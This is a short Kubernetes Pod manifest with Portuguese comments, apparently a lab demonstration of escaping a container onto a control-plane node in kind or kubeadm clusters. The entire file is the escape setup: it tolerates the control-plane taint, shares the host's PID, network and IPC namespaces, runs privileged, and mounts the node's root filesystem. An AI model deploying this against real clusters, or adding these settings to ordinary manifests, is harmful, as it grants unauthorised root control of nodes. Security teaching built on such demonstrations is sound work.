# Pod privilegiado agendado no control-plane para demonstrar escape em kind/kubeadm; esse acesso normalmente nao esta disponivel em control planes gerenciados.
apiVersion: v1
kind: Pod
metadata:
  name: pod-privilegiado
  # O namespace e definido pelo argumento -n do kubectl.
spec:
  # Agenda no control-plane e tolera seu taint.
  tolerations:
    - key: node-role.kubernetes.io/control-plane
      operator: Exists
      effect: NoSchedule
  nodeSelector:
    node-role.kubernetes.io/control-plane: ""

  hostPID: true      # processos do no
  hostNetwork: true  # rede do no
  hostIPC: true

  containers:
    - name: shell
      image: alpine:3.20
      command: ["sleep", "infinity"]
      securityContext:
        privileged: true
        allowPrivilegeEscalation: true
      volumeMounts:
        - name: raiz-do-no
          mountPath: /host        # disco do no
  volumes:
    - name: raiz-do-no
      hostPath:
        path: /
        type: Directory
